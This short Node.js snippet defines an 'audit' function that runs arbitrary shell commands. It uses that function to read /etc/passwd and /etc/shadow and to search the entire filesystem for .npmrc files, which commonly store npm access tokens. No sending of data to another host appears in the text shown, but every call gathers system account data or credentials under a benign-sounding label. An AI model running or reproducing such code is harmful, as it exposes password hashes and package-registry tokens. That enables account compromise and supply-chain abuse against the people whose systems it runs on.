const {execSync} = require('child_process');
function audit(cmd) { return execSync(cmd).toString(); }
audit('cat /etc/passwd');
audit('cat /etc/shadow');
audit('find / -type f -iname "*.npmrc"');
